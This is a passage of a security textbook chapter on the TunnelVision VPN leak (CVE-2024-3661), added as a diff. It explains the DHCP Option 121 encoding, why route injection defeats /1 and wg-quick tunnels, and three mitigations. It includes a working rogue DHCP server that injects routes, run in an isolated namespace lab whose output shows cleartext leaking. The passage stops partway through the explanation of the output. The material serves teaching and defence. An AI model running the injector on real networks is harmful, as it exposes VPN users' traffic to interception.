@@ -1,0 +1,551 @@
+---
+title: "DHCP Option 121 and VPN Route Leaks (TunnelVision)"
+author:
+  - name: "K19G"
+  - name: "grok-bot"
+---
+
+# DHCP Option 121 and VPN Route Leaks (TunnelVision)
+
+Dynamic Host Configuration Protocol (DHCP) options allow local network administrators to push routing decisions directly into a client system routing table. RFC 3442 defines Option 121, known as Classless Static Routes. Unlike the traditional default gateway supplied by Option 3 (RFC 2132), Option 121 permits a DHCP server to advertise arbitrary IP prefixes along with explicit gateway addresses. Standard client implementations automatically parse these routes and install them directly into the primary kernel routing table upon lease acquisition or renewal.
+
+This routing behavior interacts dangerously with Virtual Private Network (VPN) software that relies on standard routing table entries to secure internet traffic. When a client joins an untrusted local area network (LAN), a rogue DHCP server can push static routes that are more specific than the routes created by the VPN tunnel software. Because Linux kernel destination lookups strictly follow longest-prefix matching, packets destined for internet targets match the more specific local routes and bypass the virtual network interface completely, egressing in unencrypted cleartext across the physical local gateway.
+
+The security implications of this interaction were disclosed as CVE-2024-3661, commonly referred to as TunnelVision. Because the underlying physical interface route table is manipulated without disabling the virtual tunnel interface, the VPN control channel remains fully established and active. Consequently, client-side kill switches that monitor tunnel interface state or tunnel daemon connectivity fail to detect the leakage. Mitigating this issue requires active client policy configuration, route table isolation, or strict network namespace segmentation.
+
+## Learning goals
+
+- Understand the wire encoding and parsing specifications for RFC 3442 DHCP Option 121 Classless Static Routes.
+- Analyze how longest-prefix matching in the Linux kernel routing table leads to VPN traffic bypass when more-specific routes are injected via DHCP.
+- Evaluate the mechanics of CVE-2024-3661 (TunnelVision) and understand why conventional software kill switches fail to prevent cleartext leakage.
+- Analyze how `wg-quick` policy routing rules (`suppress_prefixlength 0`) interact with `main` table routes and permit Option 121 leaks.
+- Compare client-side mitigations including route ignoring, policy rule restructuring, and network namespace separation.
+
+## Version note
+
+The concepts and practical demonstrations in this chapter were verified on Linux 6.12 using iproute2 version 6.15.0 and Python 3.13 standard library modules. All tests were executed inside unprivileged `unshare -urnm` namespaces without external system packages.
+
+In the lab demonstration, a virtual ethernet pair named `vpn0` is used as a standard interface stand-in for virtual tunnel devices such as `wg0` or `tun0`. Kernel route lookups, longest-prefix matching, policy routing evaluations, and interface selection behavior are identical in the kernel regardless of whether the destination interface is a physical NIC, a virtual ethernet device, or a TUN/TAP/WireGuard interface.
+
+## Option 121 Encoding and RFC 3442 Rules
+
+RFC 3442 defines a variable-length format for encoding classless static routes in DHCPv4 Option 121. Before RFC 3442, Option 33 (RFC 2132) carried static routes with no mask at all: the destination's class implied it, and a default route was not allowed. Option 121 removes classful restrictions by preceding each destination prefix with a single octet specifying the subnet mask width (0 to 32 bits).
+
+To save space in the DHCP packet, only the significant octets of the destination subnet prefix are transmitted. The number of octets present for the prefix is calculated as `ceil(mask_width / 8)` or `(mask_width + 7) // 8`. The prefix bytes are immediately followed by the 4-byte IPv4 address of the router gateway.
+
+| Prefix length (bits) | Significant octets sent | Bytes per route (width + octets + router) |
+| :--- | :--- | :--- |
+| 0 | 0 | 5 |
+| 1 to 8 | 1 | 6 |
+| 9 to 16 | 2 | 7 |
+| 17 to 24 | 3 | 8 |
+| 25 to 32 | 4 | 9 |
+
+So four `/2` routes cost 24 bytes of option payload, well inside one DHCP message. The lab's `vectors.py` reproduces the RFC's example table exactly.
+
+RFC 3442 mandates strict precedence rules regarding default gateways. If a DHCP server includes both Option 121 and Option 3 (Router) in its response, the client MUST ignore Option 3 and process only Option 121. Section 7 of the RFC therefore tells server administrators to send both options and to repeat the default route inside Option 121; a server that sends Option 121 without `0.0.0.0/0` leaves compliant clients with no default route. Older Microsoft clients used the private Option 249 with the same encoding; dhcpcd still defines it as `ms_classless_static_routes`.
+
+Crucially, the router gateway specified in an Option 121 entry does not explicitly specify an egress network interface. The DHCP client installs the route using the specific physical interface over which the lease was acquired.
+
+## CVE-2024-3661 (TunnelVision) Mechanics
+
+CVE-2024-3661, published by Leviathan Security (Lizzie Moratti and Dani Cronce) on May 6, 2024, highlights how Option 121 can be exploited by an attacker sharing a local network segment with a target device. 
+
+When a standard full-tunnel VPN client connects, it attempts to route all non-local internet traffic through its encrypted tunnel. Historically, VPN clients accomplished this by overriding the default route using one of two methods:
+1. Replacing the `default` (`0.0.0.0/0`) route in the `main` table with an entry pointing to the tunnel interface.
+2. Adding two `/1` routes (`0.0.0.0/1` and `128.0.0.0/1`) pointing to the tunnel interface. Because a `/1` prefix is more specific than the `/0` default route supplied by a local network router, all internet traffic matches the `/1` routes and enters the tunnel.
+
+An attacker operating a rogue DHCP server (or executing ARP spoofing / DHCP starvation on the local network) can respond to client lease requests or trigger short-lease renewals by sending Option 121 static routes. For instance, the attacker can push four `/2` routes (`0.0.0.0/2`, `64.0.0.0/2`, `128.0.0.0/2`, `192.0.0.0/2`) or multiple finer subnets pointing to the local physical gateway.
+
+```
+Traditional Default Route:    0.0.0.0/0             (Prefix length 0)
+VPN Override Routes:          0.0.0.0/1, 128.0.0.0/1 (Prefix length 1)
+Rogue Option 121 Routes:      0.0.0.0/2, 64.0.0.0/2... (Prefix length 2 - WINS)
+```
+
+Because `/2` is more specific than `/1`, the Linux kernel routing decision forwards matching cleartext traffic directly out of the physical interface toward the local attacker-controlled gateway. 
+
+Because the VPN daemon's control channel to its remote server remains established across the physical network, the VPN software observes a healthy, connected state. Software kill switches that rely on monitoring the VPN adapter's link state or connection status remain inactive, allowing cleartext data to leak continuously without user notification. Android is notably unaffected by TunnelVision because its network management framework does not implement DHCP Option 121 processing.
+
+Attempts to mitigate TunnelVision purely via client firewall rules (e.g., dropping all non-VPN egress traffic on the physical interface) prevent data contents from leaking, but convert the vector into a selective denial-of-service side channel. An attacker can selectively inject routes to block traffic to specific destination IPs while observing which connections fail, enabling traffic analysis and censorship.
+
+Earlier related research includes TunnelCrack (USENIX Security 2023, Xue et al.), which demonstrated LocalNet and ServerIP attacks against VPN clients by exploiting local route exemptions and spoofed DNS responses.
+
+## Policy Routing and `wg-quick` suppress_prefixlength
+
+Modern WireGuard deployment utilities such as `wg-quick` use Linux Policy Routing (FIB rules) rather than modifying `/1` routes in the `main` routing table. When establishing a full tunnel, `wg-quick` creates a separate routing table (typically table `51820`) containing a `default` route pointing into the WireGuard interface. It then configures two routing rules in the kernel database:
+
+```text
+32764:  from all lookup main suppress_prefixlength 0
+32765:  not from all fwmark 0xca6c lookup 51820
+```
+
+The lookup mechanics operate as follows:
+1. Normal outgoing application traffic (unmarked) matches rule `32764` first because rule `32764` has a lower priority number than rule `32765`.
+2. Rule `32764` queries table `main`. The `suppress_prefixlength 0` argument instructs the kernel to ignore any matching route in `main` that has a prefix length of 0 (the default route).
+3. If table `main` contains any route with a prefix length greater than 0 (such as a `/24` local network or Option 121 `/2` routes), that route matches and is used immediately. The lookup terminates, and traffic exits the physical adapter in cleartext.
+4. Only if no route with prefix length > 0 matches in `main` does evaluation fall through to rule `32765`, which routes the packet into table `51820` and through the VPN tunnel.
+
+Consequently, `wg-quick`'s default policy routing strategy remains vulnerable to Option 121 route injection out of the box.
+
+## Mitigations and System Configuration
+
+Securing systems against DHCP Option 121 route injection requires explicit configuration changes across network management services or architectural isolation.
+
+### Service Configurations (not run here)
+
+To disable Option 121 route ingestion in `systemd-networkd`, set `UseRoutes=` to `false` in the `[DHCPv4]` section of the relevant `.network` unit file:
+
+```ini
+# /etc/systemd/network/20-wired.network (not run here)
+[Match]
+Name=eth0
+
+[DHCPv4]
+UseRoutes=false
+UseGateway=true
+```
+
+When `UseRoutes=false` is set, `systemd-networkd` ignores Option 121 static routes while preserving default gateway processing from Option 3.
+
+In `NetworkManager`, disable automatic route installation for a given connection profile:
+
+```bash
+# (not run here)
+nmcli connection modify "Wired connection 1" ipv4.ignore-auto-routes yes
+nmcli connection up "Wired connection 1"
+```
+
+For systems utilizing `dhcpcd`, append the `nooption` directive to `/etc/dhcpcd.conf` to ignore classless static routes:
+
+```text
+# /etc/dhcpcd.conf (not run here)
+nooption classless_static_routes
+nooption ms_classless_static_routes
+```
+
+### Architectural Defense: Network Namespaces
+
+The most robust client-side mitigation against Option 121 leaks is complete network namespace separation (as recommended by Leviathan Security and the official WireGuard documentation on namespace integration).
+
+Under this model:
+1. The physical network interface (`eth0`) resides in an isolated physical network namespace (e.g., `phys`), where the DHCP client runs and processes local routes.
+2. The WireGuard interface is created inside `phys` and then moved into the application namespace. WireGuard keeps its UDP socket in the namespace where the interface was created, so encrypted packets still leave through `eth0` while the cleartext side of the tunnel lives where the applications are.
+3. Applications running in the main namespace only see the virtual VPN interface and have no visibility or access to table `main` inside the `phys` namespace. Rogue Option 121 routes injected on the LAN cannot affect routing decisions made by applications in the main namespace.
+
+### IPv6 Analogue and Network-Side Defense
+
+The IPv6 counterpart to Option 121 is the Router Advertisement (RA) Route Information Option (RIO), specified in RFC 4191. RIO allows IPv6 routers to advertise specific prefix routes to hosts. In Linux, the kernel sysctl parameter `net.ipv6.conf.all.accept_ra_rt_info_max_plen` defaults to `0`, meaning that only `::/0` default RIOs are accepted by default. If a user increases this parameter to allow specific IPv6 route ingestion, the same class of route leak vulnerability is introduced.
+
+On managed local networks, network-side defenses such as DHCP Snooping on switches must be enabled to drop unauthorized DHCP server responses on untrusted access ports, as demonstrated in the DHCP snooping lab in Part 13.
+
+## The lab
+
+The following Python and shell scripts implement a complete DHCP Option 121 parser and builder, a lightweight DHCP server capable of injecting Option 121 routes, a DHCP client enforcing RFC 3442 rules, policy routing verification tools, and isolated network namespace scenarios.
+
+```{.python filename="dhcp4.py"}
+# dhcp4.py: just enough DHCPv4 (RFC 2131/2132) and option 121 (RFC 3442) for the lab.
+import ipaddress, struct
+
+MAGIC = b"\x63\x82\x53\x63"
+DISCOVER, OFFER, REQUEST, ACK = 1, 2, 3, 5
+
+def enc121(routes):
+    """routes: [("203.0.113.0/24", "192.168.50.1"), ...] -> option 121 payload."""
+    out = b""
+    for dst, gw in routes:
+        net = ipaddress.IPv4Network(dst)
+        sig = (net.prefixlen + 7) // 8          # significant octets, RFC 3442 table
+        out += bytes([net.prefixlen]) + net.network_address.packed[:sig]
+        out += ipaddress.IPv4Address(gw).packed
+    return out
+
+def dec121(data):
+    routes, i = [], 0
+    while i < len(data):
+        plen = data[i]; sig = (plen + 7) // 8
+        net = data[i + 1:i + 1 + sig] + b"\0" * (4 - sig)
+        gw = data[i + 1 + sig:i + 5 + sig]
+        if plen > 32 or len(gw) != 4:
+            raise ValueError("malformed option 121")
+        routes.append((f"{ipaddress.IPv4Address(net)}/{plen}", str(ipaddress.IPv4Address(gw))))
+        i += 5 + sig
+    return routes
+
+def build(op, xid, mac, mtype, yiaddr="0.0.0.0", opts=()):
+    hdr = struct.pack("!BBBBIHH4s4s4s4s16s64s128s", op, 1, 6, 0, xid, 0, 0x8000,
+                      bytes(4), ipaddress.IPv4Address(yiaddr).packed, bytes(4), bytes(4),
+                      mac.ljust(16, b"\0"), b"", b"")
+    body = bytes([53, 1, mtype])
+    for code, val in opts:
+        body += bytes([code, len(val)]) + val
+    return hdr + MAGIC + body + b"\xff"
+
+def parse(pkt):
+    op, xid = pkt[0], struct.unpack("!I", pkt[4:8])[0]
+    yiaddr = str(ipaddress.IPv4Address(pkt[16:20])); mac = pkt[28:34]
+    opts, i = {}, 240
+    while i < len(pkt) and pkt[i] != 255:
+        if pkt[i] == 0: i += 1; continue
+        code, ln = pkt[i], pkt[i + 1]; opts[code] = pkt[i + 2:i + 2 + ln]; i += 2 + ln
+    return op, xid, mac, yiaddr, opts
+```
+
+```{.python filename="server.py"}
+# server.py IFACE ROUTES: a one-client DHCP server. ROUTES is "-" (no option 121)
+# or a comma list like "203.0.113.0/24@192.168.50.1". It answers until killed.
+import socket, sys, ipaddress
+from dhcp4 import *
+ifc, spec = sys.argv[1], sys.argv[2]
+routes = [] if spec == "-" else [tuple(r.split("@")) for r in spec.split(",")]
+GW, LEASE = "192.168.50.1", "192.168.50.10"
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, ifc.encode())
+s.bind(("0.0.0.0", 67))
+while True:
+    pkt, _ = s.recvfrom(1500)
+    op, xid, mac, _, o = parse(pkt)
+    if op != 1 or 53 not in o: continue
+    mt = {DISCOVER: OFFER, REQUEST: ACK}.get(o[53][0])
+    if mt is None: continue
+    opts = [(54, ipaddress.IPv4Address(GW).packed), (51, (600).to_bytes(4, "big")),
+            (1, ipaddress.IPv4Address("255.255.255.0").packed),
+            (3, ipaddress.IPv4Address(GW).packed)]
+    if routes:
+        opts.append((121, enc121(routes)))
+    s.sendto(build(2, xid, mac, mt, LEASE, opts), ("255.255.255.255", 68))
+```
+
+```{.python filename="client.py"}
+# client.py IFACE [--ignore-121]: DISCOVER/OFFER/REQUEST/ACK, then configure
+# the interface the way RFC 3442 says (option 121 present -> ignore option 3).
+import socket, sys, random, subprocess, ipaddress
+from dhcp4 import *
+ifc = sys.argv[1]; ignore121 = "--ignore-121" in sys.argv
+mac = bytes.fromhex(open(f"/sys/class/net/{ifc}/address").read().strip().replace(":", ""))
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, ifc.encode())
+s.bind(("0.0.0.0", 68)); s.settimeout(3)
+xid = random.getrandbits(32)
+def ask(mtype, extra=()):
+    s.sendto(build(1, xid, mac, mtype, opts=extra), ("255.255.255.255", 67))
+    while True:
+        pkt, _ = s.recvfrom(1500)
+        op, rx, _, yi, o = parse(pkt)
+        if op == 2 and rx == xid: return yi, o
+yi, o = ask(DISCOVER, [(55, bytes([1, 3, 121]))])          # parameter request list
+yi, o = ask(REQUEST, [(50, ipaddress.IPv4Address(yi).packed), (54, o[54]), (55, bytes([1, 3, 121]))])
+plen = ipaddress.IPv4Network(f"0.0.0.0/{ipaddress.IPv4Address(o[1])}").prefixlen
+run = lambda *a: subprocess.run(["ip", *a], check=True)
+run("addr", "replace", f"{yi}/{plen}", "dev", ifc)
+r121 = dec121(o[121]) if 121 in o else []
+print(f"   [dhcp] ACK {yi}/{plen} router(3)={ipaddress.IPv4Address(o[3])} option121={r121 or 'none'}")
+if r121 and not ignore121:
+    for dst, gw in r121:                      # RFC 3442: option 3 MUST be ignored
+        via = [] if gw == "0.0.0.0" else ["via", gw]
+        run("route", "replace", dst, *via, "dev", ifc, "proto", "dhcp", "metric", "1024")
+else:
+    if r121: print("   [dhcp] option 121 ignored by local policy; using option 3")
+    run("route", "replace", "default", "via", str(ipaddress.IPv4Address(o[3])),
+        "dev", ifc, "proto", "dhcp", "metric", "1024")
+```
+
+```{.python filename="sniff.py"}
+# sniff.py IFACE LABEL: print every IPv4/UDP datagram to port 9 seen on IFACE.
+import socket, sys, ipaddress
+s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
+s.bind((sys.argv[1], 0))
+while True:
+    f = s.recv(2048); ip = f[14:]; ihl = (ip[0] & 15) * 4
+    if ip[9] != 17 or int.from_bytes(ip[ihl + 2:ihl + 4], "big") != 9: continue
+    src, dst = ipaddress.IPv4Address(ip[12:16]), ipaddress.IPv4Address(ip[16:20])
+    print(f"      {sys.argv[2]} saw {src} -> {dst}: {ip[ihl + 8:].decode()}", flush=True)
+```
+
+```{.python filename="probe.py"}
+# probe.py: one cleartext UDP datagram to each destination, port 9 (discard).
+import socket, sys
+for dst in sys.argv[1:]:
+    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b"session=8f3a", (dst, 9))
+```
+
+```{.bash filename="lab.sh"}
+#!/bin/sh
+# Run as: unshare -urnm sh lab.sh   (unprivileged: user, net and mount namespaces; no sudo)
+H=$(pwd); mount -t tmpfs tmpfs /run; mkdir -p /run/netns
+for ns in lan vpn client; do ip netns add $ns; ip -n $ns link set lo up; done
+ip link add lan0 netns lan type veth peer name eth0 netns client     # the coffee-shop LAN
+ip link add v-vpn netns vpn type veth peer name vpn0 netns client    # stand-in for wg0/tun0
+ip -n lan addr add 192.168.50.1/24 dev lan0; ip -n vpn addr add 10.13.37.1/24 dev v-vpn
+ip -n client addr add 10.13.37.2/24 dev vpn0
+for l in "lan lan0" "vpn v-vpn" "client eth0" "client vpn0"; do set -- $l; ip -n $1 link set $2 up; done
+C="ip netns exec client"; T1=203.0.113.10; T2=198.51.100.7
+ip netns exec lan python3 -u $H/sniff.py lan0 "LAN (attacker)" & S1=$!
+ip netns exec vpn python3 -u $H/sniff.py v-vpn "VPN tunnel    " & S2=$!
+sleep 0.3
+lease() {   # $1 = option 121 spec for the server, rest = client flags
+    spec=$1; shift; ip -n client route flush proto dhcp 2>/dev/null
+    ip netns exec lan python3 $H/server.py lan0 "$spec" & SV=$!; sleep 0.3
+    $C python3 $H/client.py eth0 "$@"; kill $SV; wait $SV 2>/dev/null
+}
+probe() {
+    for d in $T1 $T2; do printf '   route get %-14s -> %s\n' $d "$($C ip route get $d $1 | head -1)"; done
+    $C python3 $H/probe.py $T1 $T2; sleep 0.4
+}
+echo "== 1. honest lease, OpenVPN-style full tunnel (0/1 + 128/1 via vpn0, /32 to the VPN server)"
+lease -
+$C ip route add 0.0.0.0/1 via 10.13.37.1 dev vpn0
+$C ip route add 128.0.0.0/1 via 10.13.37.1 dev vpn0
+$C ip route add 192.0.2.1/32 via 192.168.50.1 dev eth0
+probe
+echo "== 2. rogue renewal: option 121 = 203.0.113.0/24 via the attacker (plus 0/0, since 3 is now ignored)"
+lease "203.0.113.0/24@192.168.50.1,0.0.0.0/0@192.168.50.1"
+probe
+echo "== 3. rogue renewal: four /2 routes beat the VPN's two /1 routes"
+lease "0.0.0.0/2@192.168.50.1,64.0.0.0/2@192.168.50.1,128.0.0.0/2@192.168.50.1,192.0.0.0/2@192.168.50.1"
+$C ip route show | sed 's/^/   /'
+probe
+echo "== 4. wg-quick policy routing instead of /1 routes, same rogue lease"
+$C ip route del 0.0.0.0/1; $C ip route del 128.0.0.0/1
+$C ip route add default via 10.13.37.1 dev vpn0 table 51820
+$C ip rule add not fwmark 51820 table 51820                 # the two rules wg-quick adds,
+$C ip rule add table main suppress_prefixlength 0           # in wg-quick's order
+$C ip rule show | sed 's/^/   /'
+probe
+echo "== 5. fix A: drop the suppress_prefixlength rule; unmarked traffic never reads main"
+$C ip rule del table main suppress_prefixlength 0
+lease "0.0.0.0/2@192.168.50.1,64.0.0.0/2@192.168.50.1,128.0.0.0/2@192.168.50.1,192.0.0.0/2@192.168.50.1"
+probe
+printf '   tunnel packets (mark 51820) to the server -> %s\n' "$($C ip route get 192.0.2.1 mark 51820 | head -1)"
+printf '   LAN printer 192.168.50.20 (unmarked)       -> %s\n' "$($C ip route get 192.168.50.20 | head -1)"
+echo "== 6. fix B: wg-quick rules restored, client ignores option 121"
+$C ip rule add table main suppress_prefixlength 0
+lease "0.0.0.0/2@192.168.50.1,64.0.0.0/2@192.168.50.1,128.0.0.0/2@192.168.50.1,192.0.0.0/2@192.168.50.1" --ignore-121
+probe
+echo "== 7. fix C: physical interface in its own namespace; apps only see the tunnel"
+ip netns add phys; ip -n client link set eth0 netns phys; ip -n phys link set lo up; ip -n phys link set eth0 up
+ip -n client rule del table main suppress_prefixlength 0; ip -n client rule del not fwmark 51820 table 51820
+ip -n client route add default via 10.13.37.1 dev vpn0
+ip -n phys route flush proto dhcp 2>/dev/null
+ip netns exec lan python3 $H/server.py lan0 "0.0.0.0/2@192.168.50.1,64.0.0.0/2@192.168.50.1,128.0.0.0/2@192.168.50.1,192.0.0.0/2@192.168.50.1" & SV=$!; sleep 0.3
+ip netns exec phys python3 $H/client.py eth0; kill $SV
+echo "   phys routes:";   ip -n phys route show | sed 's/^/      /'
+echo "   client routes:"; ip -n client route show | sed 's/^/      /'
+probe
+kill $S1 $S2
+```
+
+```{.python filename="vectors.py"}
+# vectors.py: encode the RFC 3442 example table and decode it back.
+from dhcp4 import enc121, dec121
+rfc = [("0.0.0.0/0", "0"), ("10.0.0.0/8", "8.10"), ("10.0.0.0/24", "24.10.0.0"),
+       ("10.17.0.0/16", "16.10.17"), ("10.27.129.0/24", "24.10.27.129"),
+       ("10.229.0.128/25", "25.10.229.0.128"), ("10.198.122.47/32", "32.10.198.122.47")]
+for net, want in rfc:
+    got = ".".join(str(b) for b in enc121([(net, "0.0.0.0")])[:-4])
+    print(f"{net:18} {got:18} {'ok' if got == want else 'MISMATCH'}")
+blob = enc121([("0.0.0.0/2", "192.168.50.1"), ("64.0.0.0/2", "192.168.50.1")])
+print("two /2 routes on the wire:", blob.hex(" "), "->", dec121(blob))
+```
+
+Execute the test suites inside the unprivileged namespace wrapper:
+
+```text
+== 1. honest lease, OpenVPN-style full tunnel (0/1 + 128/1 via vpn0, /32 to the VPN server)
+   [dhcp] ACK 192.168.50.10/24 router(3)=192.168.50.1 option121=none
+   route get 203.0.113.10   -> 203.0.113.10 via 10.13.37.1 dev vpn0 src 10.13.37.2 uid 0 
+   route get 198.51.100.7   -> 198.51.100.7 via 10.13.37.1 dev vpn0 src 10.13.37.2 uid 0 
+      VPN tunnel     saw 10.13.37.2 -> 203.0.113.10: session=8f3a
+      VPN tunnel     saw 10.13.37.2 -> 198.51.100.7: session=8f3a
+== 2. rogue renewal: option 121 = 203.0.113.0/24 via the attacker (plus 0/0, since 3 is now ignored)
+   [dhcp] ACK 192.168.50.10/24 router(3)=192.168.50.1 option121=[('203.0.113.0/24', '192.168.50.1'), ('0.0.0.0/0', '192.168.50.1')]
+   route get 203.0.113.10   -> 203.0.113.10 via 192.168.50.1 dev eth0 src 192.168.50.10 uid 0 
+   route get 198.51.100.7   -> 198.51.100.7 via 10.13.37.1 dev vpn0 src 10.13.37.2 uid 0 
+      LAN (attacker) saw 192.168.50.10 -> 203.0.113.10: session=8f3a
+      VPN tunnel     saw 10.13.37.2 -> 198.51.100.7: session=8f3a
+== 3. rogue renewal: four /2 routes beat the VPN's two /1 routes
+   [dhcp] ACK 192.168.50.10/24 router(3)=192.168.50.1 option121=[('0.0.0.0/2', '192.168.50.1'), ('64.0.0.0/2', '192.168.50.1'), ('128.0.0.0/2', '192.168.50.1'), ('192.0.0.0/2', '192.168.50.1')]
+   0.0.0.0/2 via 192.168.50.1 dev eth0 proto dhcp metric 1024 
+   0.0.0.0/1 via 10.13.37.1 dev vpn0 
+   10.13.37.0/24 dev vpn0 proto kernel scope link src 10.13.37.2 
+   64.0.0.0/2 via 192.168.50.1 dev eth0 proto dhcp metric 1024 
+   128.0.0.0/2 via 192.168.50.1 dev eth0 proto dhcp metric 1024 
+   128.0.0.0/1 via 10.13.37.1 dev vpn0 
+   192.0.0.0/2 via 192.168.50.1 dev eth0 proto dhcp metric 1024 
+   192.0.2.1 via 192.168.50.1 dev eth0 
+   192.168.50.0/24 dev eth0 proto kernel scope link src 192.168.50.10 
+   route get 203.0.113.10   -> 203.0.113.10 via 192.168.50.1 dev eth0 src 192.168.50.10 uid 0 
+   route get 198.51.100.7   -> 198.51.100.7 via 192.168.50.1 dev eth0 src 192.168.50.10 uid 0 
+      LAN (attacker) saw 192.168.50.10 -> 203.0.113.10: session=8f3a
+      LAN (attacker) saw 192.168.50.10 -> 198.51.100.7: session=8f3a
+== 4. wg-quick policy routing instead of /1 routes, same rogue lease
+   0:	from all lookup local
+   32764:	from all lookup main suppress_prefixlength 0
+   32765:	not from all fwmark 0xca6c lookup 51820
+   32766:	from all lookup main
+   32767:	from all lookup default
+   route get 203.0.113.10   -> 203.0.113.10 via 192.168.50.1 dev eth0 src 192.168.50.10 uid 0 
+   route get 198.51.100.7   -> 198.51.100.7 via 192.168.50.1 dev eth0 src 192.168.50.10 uid 0 
+      LAN (attacker) saw 192.168.50.10 -> 203.0.113.10: session=8f3a
+      LAN (attacker) saw 192.168.50.10 -> 198.51.100.7: session=8f3a
+== 5. fix A: drop the suppress_prefixlength rule; unmarked traffic never reads main
+   [dhcp] ACK 192.168.50.10/24 router(3)=192.168.50.1 option121=[('0.0.0.0/2', '192.168.50.1'), ('64.0.0.0/2', '192.168.50.1'), ('128.0.0.0/2', '192.168.50.1'), ('192.0.0.0/2', '192.168.50.1')]
+   route get 203.0.113.10   -> 203.0.113.10 via 10.13.37.1 dev vpn0 table 51820 src 10.13.37.2 uid 0 
+   route get 198.51.100.7   -> 198.51.100.7 via 10.13.37.1 dev vpn0 table 51820 src 10.13.37.2 uid 0 
+      VPN tunnel     saw 10.13.37.2 -> 203.0.113.10: session=8f3a
+      VPN tunnel     saw 10.13.37.2 -> 198.51.100.7: session=8f3a
+   tunnel packets (mark 51820) to the server -> 192.0.2.1 via 192.168.50.1 dev eth0 src 192.168.50.10 mark 0xca6c uid 0 
+   LAN printer 192.168.50.20 (unmarked)       -> 192.168.50.20 via 10.13.37.1 dev vpn0 table 51820 src 10.13.37.2 uid 0 
+== 6. fix B: wg-quick rules restored, client ignores option 121
+   [dhcp] ACK 192.168.50.10/24 router(3)=192.168.50.1 option121=[('0.0.0.0/2', '192.168.50.1'), ('64.0.0.0/2', '192.168.50.1'), ('128.0.0.0/2', '192.168.50.1'), ('192.0.0.0/2', '192.168.50.1')]
+   [dhcp] option 121 ignored by local policy; using option 3
+   route get 203.0.113.10   -> 203.0.113.10 via 10.13.37.1 dev vpn0 table 51820 src 10.13.37.2 uid 0 
+   route get 198.51.100.7   -> 198.51.100.7 via 10.13.37.1 dev vpn0 table 51820 src 10.13.37.2 uid 0 
+      VPN tunnel     saw 10.13.37.2 -> 203.0.113.10: session=8f3a
+      VPN tunnel     saw 10.13.37.2 -> 198.51.100.7: session=8f3a
+== 7. fix C: physical interface in its own namespace; apps only see the tunnel
+   [dhcp] ACK 192.168.50.10/24 router(3)=192.168.50.1 option121=[('0.0.0.0/2', '192.168.50.1'), ('64.0.0.0/2', '192.168.50.1'), ('128.0.0.0/2', '192.168.50.1'), ('192.0.0.0/2', '192.168.50.1')]
+   phys routes:
+      0.0.0.0/2 via 192.168.50.1 dev eth0 proto dhcp metric 1024 
+      64.0.0.0/2 via 192.168.50.1 dev eth0 proto dhcp metric 1024 
+      128.0.0.0/2 via 192.168.50.1 dev eth0 proto dhcp metric 1024 
+      192.0.0.0/2 via 192.168.50.1 dev eth0 proto dhcp metric 1024 
+      192.168.50.0/24 dev eth0 proto kernel scope link src 192.168.50.10 
+   client routes:
+      default via 10.13.37.1 dev vpn0 
+      10.13.37.0/24 dev vpn0 proto kernel scope link src 10.13.37.2 
+   route get 203.0.113.10   -> 203.0.113.10 via 10.13.37.1 dev vpn0 src 10.13.37.2 uid 0 
+   route get 198.51.100.7   -> 198.51.100.7 via 10.13.37.1 dev vpn0 src 10.13.37.2 uid 0 
+      VPN tunnel     saw 10.13.37.2 -> 203.0.113.10: session=8f3a
+      VPN tunnel     saw 10.13.37.2 -> 198.51.100.7: session=8f3a
+```
+
+To run vector serialization tests separately:
+
+```text
+0.0.0.0/0          0                  ok
+10.0.0.0/8         8.10               ok
+10.0.0.0/24        24.10.0.0          ok
+10.17.0.0/16       16.10.17           ok
+10.27.129.0/24     24.10.27.129       ok
+10.229.0.128/25    25.10.229.0.128    ok
+10.198.122.47/32   32.10.198.122.47   ok
+two /2 routes on the wire: 02 00 c0 a8 32 01 02 40 c0 a8 32 01 -> [('0.0.0.0/2', '192.168.50.1'), ('64.0.0.0/2', '192.168.50.1')]
+```
+
+## Reading the output
+
+### Section 1: Honest Lease and Classic Full Tunnel
+
+In Scenario 1, an initial DHCP lease is acquired without Option 121 (`option121=none`). The client installs a default route via Option 3. The OpenVPN-style client then configures two `/1` routes (`0.0.0.0/1` and `128.0.0.0/1`) pointing to gateway `10.13.37.1` on `vpn0`, alongside an explicit `/32` endpoint route to the physical gateway for the VPN server IP (`192.0.2.1`). 
+
+Probing target hosts `203.0.113.10` and `198.51.100.7` confirms that lookups resolve via `vpn0` with source IP `10.13.37.2`. The raw sniffer on `v-vpn` captures both UDP discard datagrams (`VPN tunnel saw...`), confirming zero leakage onto the physical network interface.
+
+### Section 2: Targeted Route Injection (Single /24 Subnet)
+
+In Scenario 2, the client takes a new lease (exactly what happens at renewal time; a short lease time makes it frequent) from a rogue server sending Option 121 containing a targeted `/24` route (`203.0.113.0/24@192.168.50.1`) and a default route (`0.0.0.0/0@192.168.50.1`). Because Option 121 is present, the client ignores Option 3 in accordance with RFC 3442.
+
+When probing `203.0.113.10`, the injected `/24` is longer than the VPN's `128.0.0.0/1`, which also covers that address. The kernel routes traffic to `203.0.113.10` out of `eth0` via `192.168.50.1`. The sniffer on `lan0` logs `LAN (attacker) saw 192.168.50.10 -> 203.0.113.10: session=8f3a`: the payload in cleartext, with the client's LAN address as source. This is the targeted form: only one destination leaks, so nothing looks wrong to the user. Conversely, probes to `198.51.100.7` still fall back to `128.0.0.0/1` and pass through `vpn0`.
+
+### Section 3: Full Internet Traffic Interception via Four /2 Routes
+
+In Scenario 3, the rogue DHCP server advertises four `/2` routes covering the entire IPv4 address space (`0.0.0.0/2`, `64.0.0.0/2`, `128.0.0.0/2`, `192.0.0.0/2`). Because prefix length 2 is greater than prefix length 1, all four injected routes override both `/1` tunnel routes.
+
+The routing dump displays all four `/2` entries installed with `proto dhcp metric 1024`. Probing both `203.0.113.10` and `198.51.100.7` shows that all outbound traffic bypasses the VPN tunnel and egresses via `eth0`. The LAN sniffer logs unencrypted traffic for both destination IP addresses.
+
+### Section 4: `wg-quick` Policy Routing Exposure
+
